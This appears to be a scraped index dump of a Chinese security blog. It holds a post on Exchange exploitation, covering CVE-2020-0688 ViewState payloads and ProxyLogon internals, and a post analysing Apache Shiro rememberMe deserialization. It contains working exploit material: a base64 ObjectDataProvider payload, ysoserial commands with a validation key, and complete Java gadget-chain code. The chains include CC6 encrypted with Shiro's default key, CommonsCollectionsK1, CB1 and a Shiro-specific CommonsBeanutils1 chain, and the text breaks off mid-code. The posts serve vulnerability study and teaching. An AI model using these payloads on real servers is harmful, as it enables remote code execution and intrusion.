AgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LSXUwoXG5VzeGJVCJLwnNz8xsRfw= 生成完 payload 代码后，需要对该代码中的特殊字符进行 URL Encode 编码构造一个 URL： /ecp/default.aspx?__VIEWSTATEGENERATOR=\u003cgenerator\u003e\u0026__VIEWSTATE=\u003cViewState\u003e 将最开始获得的 __VIEWSTATEGENERATOR 值替换 generator，将 URL Encode 编码后的 payload 替换 ViewState。 生成写文件的 payload ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"cmd /c echo POC \u003e C:\\1.txt\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"B97B4E27\" --viewstateuserkey=\"80677c59-fde2-4534-b8ae-97f3997b009a\" --isdebug --islegacy ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:2","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"5.3 ProxyLogon 5.3.1 漏洞描述 ProxyLogon 是 CVE-2021-26855 和 CVE-2021-27065 两个漏洞的组合利用。 Exchange 是一个非常复杂的应用程序。 自 2000 年以来，Exchange 每 3 年发布一个新版本。 每当 Exchange 发布新版本时，体系结构都会发生很大变化并变得不同。架构和迭代的变化使得升级 Exchange Server 变得困难。 为了保证新旧架构之间的兼容性，Exchange Server 导致存在了新的攻击面。 在 Microsoft Exchange 上重点关注于客户端访问服务 Client Access Service(CAS)。 CAS 是 Exchange 的基本组件。在 Exchange 2000/2003 版本，CAS 是一个独立的 Frontend Server，负责所有 Frontend Web 的逻辑。 经过多次重命名、集成和版本差异，CAS 已成为 Mail Role 下的组件。 5.3.1.1 CAS 架构 CAS 是负责接受来自客户端的所有连接的基本组件，包括 HTTP、POP3、IMAP 还是 SMTP，并将连接代理到相应的后端服务。 CAS 网站搭建在 Microsoft IIS 上。IIS 中有两个站点。「Default Website」是之前提到的前端，「Exchange Backend」是负责处理业务逻辑。查看配置后可以发现，Frontend 绑定了 80 和 443 端口，Exchange Backend 监听了 81 和 444 端口。所有端口都绑定了 0.0.0.0，这意味着可以访问 Frontend 和 Backend。 Exchange 系统的服务架构如下图所示，由前端和多个后端组件组成。⽤户基于各类协议对 Exchange 的前端发起请求，前端解析请求后会将其转发到后端相对应的服务当中。以基于 HTTP/HTTPS 协议的访问为例，来⾃ Outlook 或 Web 客户端的请求会⾸先经过 IIS，然后进⼊到 Exchange 的 HTTP 代理，代理根据请求类型将 HTTP 请求转发到不同的后端组件中。 5.3.1.2 Frontend Proxy Frontend Proxy 模块根据当前的 ApplicationPath 选择处理程序来处理来自客户端的 HTTP 请求。 比如访问 /EWS 会使用 EwsProxyRequestHandler，而 /OWA 会触发 OwaProxyRequestHandler。 Exchange 中的所有处理程序都继承了 ProxyRequestHandler 类，并实现了它的核心逻辑，包括：如何处理来自用户的 HTTP 请求，从 Backend 到代理的 URL，以及如何与 Backend 同步信息。该类也是整个 Proxy Module 中最核心的部分，将 ProxyRequestHandler 分成 3 个部分： Request Section Request Section 解析来自客户端的 HTTP 请求并确定哪些 cookie 和标头可以代理到后端。Frontend 和 Backend 依靠 HTTP Headers 来同步信息和代理内部状态。因此，Exchange 定义了一个黑名单，以避免某些内部 Headers 被滥用。 protected virtual bool ShouldCopyHeaderToServerRequest(string headerName) { return !string.Equals(headerName, \"X-CommonAccessToken\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-IsFromCafe\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-SourceCafeServer\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"msExchProxyUri\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-MSExchangeActivityCtx\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"return-client-request-id\", OrdinalIgnoreCase) \u0026\u0026 !string.Equals(headerName, \"X-Forwarded-For\", OrdinalIgnoreCase) \u0026\u0026 (!headerName.StartsWith(\"X-Backend-Diag-\", OrdinalIgnoreCase) || this.ClientRequest.GetHttpRequestBase().IsProbeRequest()); } 在 Request 的最后阶段，Proxy Module 会调用 handler 实现的 AddProtocolSpecificHeadersToServerRequest 方法，在 HTTP 头中添加要与 Backend 交换的信息。这一阶段还会将当前登录用户的信息序列化，放到一个新的 HTTP 头 X-CommonAccessToken 中，再转发给 Backend。 Proxy Section Proxy Section 首先使用 GetTargetBackendServerURL 方法来计算应将 HTTP 请求转发到哪个后端 URL。 然后使用 CreateServerRequest 方法初始化一个新的 HTTP 客户端请求。 HttpProxy\\ProxyRequestHandler.cs protected HttpWebRequest CreateServerRequest(Uri targetUrl) { HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(targetUrl); if (!HttpProxySettings.UseDefaultWebProxy.Value) { httpWebRequest.Proxy = NullWebProxy.Instance; } httpWebRequest.ServicePoint.ConnectionLimit = HttpProxySettings.ServicePointConnectionLimit.Value; httpWebRequest.Method = this.ClientRequest.HttpMethod; httpWebRequest.Headers[\"X-FE-ClientIP\"] = ClientEndpointResolver.GetClientIP(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); httpWebRequest.Headers[\"X-Forwarded-For\"] = ClientEndpointResolver.GetClientProxyChainIPs(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); httpWebRequest.Headers[\"X-Forwarded-Port\"] = ClientEndpointResolver.GetClientPort(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); httpWebRequest.Headers[\"X-MS-EdgeIP\"] = Utilities.GetEdgeServerIpAsProxyHeader(SharedHttpContextWrapper.GetWrapper(this.HttpContext).Request); // ... return httpWebRequest; } Exchange 还将通过后端的 HTTP Service-Class 生成 Kerberos 票证，并将其放入 Authorization 头中。 此请求头旨在防止匿名用户直接访问后端。使用 Kerberos 票证，后端可以验证来自前端的访问。 HttpProxy\\ProxyRequestHandler.cs if (this.ProxyKerberosAuthentication) { serverRequest.ConnectionGroupName = this.ClientRequest.UserHostAddress + \":\" + GccUtils.GetClientPort(SharedHttpContextWrapper.GetWrapper(this.HttpContext)); } else if (this.AuthBehavior.AuthState == AuthState.BackEndFullAuth || this. ShouldBackendRequestBeAnonymous() || (HttpProxySettings.TestBackEndSupportEnabled.Value \u0026\u0026 !","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:5:3","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["内网渗透"],"content":"参考 深入 Exchange Server 在网络渗透下的利用方法 Abusing Exchange: One API call away from Domain Admin cve-2020-0688-Exchange-远程代码执行介绍 A New Attack Surface on MS Exchange Part 1 - ProxyLogon! ProxyLogon漏洞分析 Exchange ProxyLogon 系列漏洞分析 ","date":"2021-10-14","objectID":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:6:0","tags":["域安全","内网渗透"],"title":"Exchange 漏洞利用","uri":"/2021/10/exchange%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["代码审计"],"content":"Shiro 反序列化漏洞 \u0026 CommonsCollectionsK1 \u0026 CommonsBeanutils1","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"Shiro 反序列化漏洞原理分析 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:0:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"1 概述 Apache Shiro 在 Java 的权限及安全验证框架中占用重要的一席之地，在它编号为 550 的 issue 中爆出严重的 Java 反序列化漏洞。 Shiro反序列化漏洞的原理比较简单：为了让浏览器或服务器重启后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存在 Cookie 的 rememberMe 字段中，下次读取时进行解密再反序列化。但是在 Shiro 1.2.4 版本之前内置了一个默认且固定的加密 Key，导致攻击者可以伪造任意的 rememberMe Cookie，进而触发反序列化漏洞。 前面的文章，介绍了 Commons-Collections 链的各种 Gadget，分为两种利用方式：一种是 InvokerTransformer，通过 Runtime.exec() 命令执行；另一种是 TemplatesImpl，通过加载类字节码的形式代码执行。 本文先以一个实际的例子 —— Shiro 反序列化漏洞，来实际使用一下 TemplatesImpl 。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:1:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"2 漏洞环境搭建 利用 靶场 搭建漏洞环境，整个项目只有两个代码文件，index.jsp 和 login.jsp，依赖这块也仅有下面几个: shiro-core、shiro-web，这是 shiro 本身的依赖 javax.servlet-api、jsp-api，这是 JSP 和 Servlet 的依赖，仅在编译阶段使用，因为 Tomcat 中自带这两个依赖 slf4j-api、slf4j-simple，这是为了显示 shiro 中的报错信息添加的依赖 commons-logging，这是 shiro 中用到的一个接口，不添加会爆 java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory 错误 commons-collections，为了演示反序列化漏洞，增加了commons-collections 依赖 使用 Maven 将项目打包成 war 包，放在 Tomcat 的 webapps 目录下。然后访问 http://localhost:8080/shirodemo/ ，会跳转到登录页面: 然后输入正确的账号密码，root/secret，可以成功登录。 如果登录时选择了 remember me 的多选框，则登录成功后服务端会返回一个 rememberMe 的 Cookie。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:2:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"3 使用 CC6 攻击 Shiro ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"3.1 概述 整个攻击过程如下： 使用 CommonsCollections 利用链生成一个序列化 Payload 使用 Shiro 默认 Key 进行加密 将密文作为 rememberMe 的 Cookie 发送给服务端 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:1","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"3.2 包含数组的反序列化 Gadget import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(\"calc.exe\"); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } 加密的过程，使用的 shiro 内置的类 org.apache.shiro.crypto.AesCipherService ，最后生成一段 base64 字符串。 直接将这段字符串作为 rememberMe 的值(不做 url 编码)，发送给 shiro。结果 Tomcat 出现了报错： 找到最后一个异常信息 org.apache.shiro.io.ClassResolvingObjectInputStream，可以看到，这是一个 ObjectInputStream 的子类，其重写了 resolveClass 方法: resolveClass 是反序列化中用来查找类的方法，在读取序列化流的时候，读到一个字符串形式的类名，需要通过这个方法来找到对应的 java.lang.Class 对象。 对比一下它的父类，也就是正常的 ObjectInputStream 类中的 resolveClass 方法： protected Class\u003c?\u003e resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); try { return Class.forName(name, false, latestUserDefinedLoader()); } catch (ClassNotFoundException ex) { Class\u003c?\u003e cl = primClasses.get(name); if (cl != null) { return cl; } else { throw ex; } } } 会发现，前者用的是 org.apache.shiro.util.ClassUtils#forName，而后者用的是 Java 原生的 Class.forName。 在异常捕捉的位置下个断点，看看是哪个类触发了异常: 可见，出异常时加载的类名为 [Lorg.apache.commons.collections.Transformer;。其实就是表示 org.apache.commons.collections.Transformer 的数组。 3.2.1 Class.forName 和 ClassLoader.loadClass 的区别 当使用 ClassLoader.loadClass(String name) 时，name 必须是 Java 语言规范定义的二进制名称，并不包括数组类；类加载器负责加载类的对象，数组类的类对象不是由类加载器创建的，而是根据 Java 运行时的要求自动创建的。 以下面代码为例： package ClassLoaderDemo; public class ClassLoaderDemo { public static void main(String[] args) throws ClassNotFoundException { String c1name = \"test1\".getClass().getName(); String c2name = new String[]{\"test2\"}.getClass().getName(); System.out.println(c1name); System.out.println(c2name); Class.forName(c1name); Class.forName(c2name); ClassLoaderDemo.class.getClassLoader().loadClass(c1name); ClassLoaderDemo.class.getClassLoader().loadClass(c2name); } } 3.2.2 真实原因 网上大部分分析原因都是说 Class.forName() 与 ClassLoader.loadClass() 的区别导致 shiro 反序列化时不能加载数组，这个原因不完全准确。 其实是 shiro 加载 Class 最终调用的是 Tomcat 下的 webappclassloader，该类会使用 Class.forName() 加载数组类，但是使用的 classloader 是 URLClassLoader，只会加载 tomcat/bin、tomcat/lib、jre/lib/ext 下面的类数组，无法加载三方依赖 jar 包。 总之，如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误。因为 CC6 用到了 Transformer 数组，因此没法正常反序列化。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:2","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"3.3 不包含数组的反序列化 Gadget 这里利用 wh1t3p1g 的思路。使用 TemplatesImpl.newTransformer 函数来动态 loadClass 构造好的evil class bytes。并且在这部分利用链上是不存在数组类型的对象的。 如何触发TemplatesImpl.newTransformer的方法？ 先来回顾一下 CommonsCollections2 的利用链： PriorityQueue.readObject -\u003e PriorityQueue.heapify() -\u003e PriorityQueue.siftDown() -\u003e PriorityQueue.siftDownUsingComparator() -\u003e TransformingComparator.compare() -\u003e InvokerTransformer.transform() -\u003e TemplatesImpl.newTransformer() ... templates Gadgets ... -\u003e Runtime.getRuntime().exec() 在这条链上，由于 TransformingComparator 在 3.2.1 的版本上还没有实现 Serializable 接口，其在 3.2.1 版本下是无法反序列化的。所以无法直接利用该payload来达到命令执行的目的。 在 InvokerTransformer.transform() 中，根据传入的 input 对象，调用其 iMethodName 方法。如果此时传入的 input 为构造好的 TemplatesImpl 对象呢？这样就可以通过将 iMethodName 置为 newTransformer，从而完成后续的 templates gadgets。 在 ysoserial 的利用链中，关于 transform 函数接收的 input 存在两种情况： 配合 ChainedTransformer 无意义的 String，这里的无意义的 String 指的是传入到 ConstantTransformer.transform 函数的 input，该 transform 函数不依赖 input，而直接返回 iConstant 从 CommonsCollection6 开始，用到了 TiedMapEntry，其作为中继，调用了 LazyMap（map）的 get 函数。 其中 map 和 key 都可以控制，而 LazyMap.get 调用了 transform 函数，并将可控的 key 传入 transform 函数： 这样就将构造好的 TemplatesImpl（key）作为 InvokerTransformer.transform 函数的 input 传入，就可以把 templates gadgets 串起来了。 这里整理一下这条链的调用过程： java.util.HashSet.readObject() -\u003e java.util.HashMap.put() -\u003e java.util.HashMap.hash() -\u003e org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -\u003e org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -\u003e org.apache.commons.collections.map.LazyMap.get() -\u003e org.apache.commons.collections.functors.InvokerTransformer.transform() -\u003e java.lang.reflect.Method.invoke() ... templates gadgets ... -\u003e java.lang.Runtime.exec() ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:3:3","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"4 实战 - CommonsCollectionsK1 首先还是创建 TemplatesImpl 对象： TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][] {\"...bytescode\"}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); 创建一个用来调用 newTransformer 方法的 InvokerTransformer，但注意的是，此时先传入一个正常的方法，比如 getClass ，避免恶意方法在构造 Gadget 的时候触发： Transformertransformer = new InvokerTransformer(\"getClass\",null,null); 再把之前的 CommonsCollections6 的代码复制过来，将原来 TiedMapEntry 构造时的第二个参数 key，改为前面创建的 TemplatesImpl 对象： Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.clear(); 完整代码如下： package com.govuln.shiroattack; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollectionsShiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\"getClass\", null, null); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \"valuevalue\"); outerMap.clear(); setFieldValue(transformer, \"iMethodName\", \"newTransformer\"); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); } } 这一个 Gadget 其实也就是 XRay 和 Koalr 师傅的 CommonsCollectionsK1 用来检测 Shiro-550 的方法。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:4:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"5 CommonsBeanutils1 Gadget 分析 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"5.1 背景 Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通 Java 类对象(也称为 JavaBean)的一些操作方法。 如 Cat 是一个最简单的 JavaBean 类：它包含一个私有属性 name，和读取和设置这个属性的两个方法，又称为 getter 和 setter。其中，getter 的方法名以 get 开头，setter 的方法名以 set 开头， final public class Cat { private String name = \"catalina\"; public String getName() { return name; } public void setName(String name) { this.name = name; } } commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意 JavaBean 的 getter 方法，比如：PropertyUtils.getProperty(new Cat(), \"name\"); 此时，commons-beanutils 会自动找到 name 属性的 getter 方法，也就是 getName，然后调用，获得返回值。除此之外， PropertyUtils.getProperty 还支持递归获取属性，比如 a 对象中有属性 b，b 对象中有属性 c，我们可以通过 PropertyUtils.getProperty(a, \"b.c\"); 的方式进行递归获取。通过该方法，使用者可以很方便地调用任意对象的 getter，适用于在不确定 JavaBean 是哪个类对象时使用。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:1","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"5.2 分析 寻找可以利用的 java.util.Comparator 对象，在 commons-beanutils 包中存在: org.apache.commons.beanutils.BeanComparator ，用来比较两个 JavaBean 是否相等的类，其实现了 java.util.Comparator 接口。我们看它的 compare 方法： 这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象。如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。PropertyUtils.getProperty 这个方法会自动去调用一个 JavaBean的getter 方法， 这个点是任意代码执行的关键。 在分析 TemplatesImpl 利用链的文章中指出，TemplatesImpl#getOutputProperties() 方法是调用链上的一环，它的内部调用了 TemplatesImpl#newTransformer() ，也就是后面常用来执行恶意字节码的方法： 而 getOutputProperties 这个名字，是以 get 开头，正符合 getter 的定义。 构造的 POC 如下： import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CB1Demo { public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\"/Volumes/MacOS/WorkSpace/JAVA/ClassLoaderVuln/http/HelloTemppaltesImpl.class\")); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); queue.add(1); queue.add(1); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); // 序列化 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); // 反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } 首先创建 TemplateImpl。然后实例化 BeanComparator 。 BeanComparator 构造函数为空时，默认的 property 就是空。再用刚刚的 comparator 实例化优先队列 PriorityQueue 。 可以看到，代码中添加了两个无害的可以比较的对象进队列中。前文说过， BeanComparator#compare() 中， 如果 this.property 为空，则直接比较这两个对象。这里实际上就是对两个 1 进行排序。 最后，再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个 1 替换成恶意的 TemplateImpl 对象。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:5:2","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"6 CB1 在 Shiro 反序列化中的利用 在前面的漏洞环境中，我们是手动添加了 Commons Collections 依赖。在实际场景中，目标系统不一定会安装 Commons Collections 库。而 commons-beanutils 默认添加。 尝试使用上文的 CB1 直接构造 payload，并发送，发现是失败的，提示 serialVersionUID 不一致。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:0","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"6.1 serialVersionUID 如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java 在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中 反序列化时，如果发现对方的环境中这个类计算出的 serialVersionUID 不同，则反序列化过程就丢异常并退出执行，避免后续的未知隐患。 所以，出现错误的原因就是，本地使用的 commons-beanutils 是 1.9.2 版本，而 Shiro 中自带的 commons-beanutils 是 1.8.3 版本，出现了 serialVersionUID 对应不上的问题。 更换版本后，再次生成 Payload 进行测试，此时 Tomcat 端爆出了另一个异常，仍然没有触发代码执行： Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator] 简单来说就是没找到 org.apache.commons.collections.comparators.ComparableComparator 类，从包名即可看出，这个类是来自于 commons-collections。 commons-beanutils 本来依赖于 commons-collections，但是在 Shiro 中，它的 commons-beanutils 虽然包含了一部分 commons-collections 的类，但却不全。这也导致，正常使用 Shiro 的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections。 ","date":"2021-10-10","objectID":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/:6:1","tags":["代码审计"],"title":"Shiro 反序列化漏洞原理分析","uri":"/2021/10/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"categories":["代码审计"],"content":"6.2 无依赖的 Shiro 反序列化 Gadget 首先确认 org.apache.commons.collections.comparators.ComparableComparator 这个类的使用情况： 在 BeanComparator 类的构造函数处，当没有显式传入 Comparator 的情况下，则默认使用 ComparableComparator 。 既然此时没有 ComparableComparator ，需要找到一个类来替换，它满足下面这几个条件： 实现 java.util.Comparator 接口 实现 java.io.Serializable 接口 Java、shiro 或 commons-beanutils 自带，且兼容性强 通过 IDEA 的 Implementation 寻找实现了 Comparator 的类： 代码如下： CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了 Comparator 和 Serializable ，且位于 Java 的核心代码中，兼容性强。 通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator : final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); 构造出新的 CommonsBeanutils1Shiro 利用链： import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1Shiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] 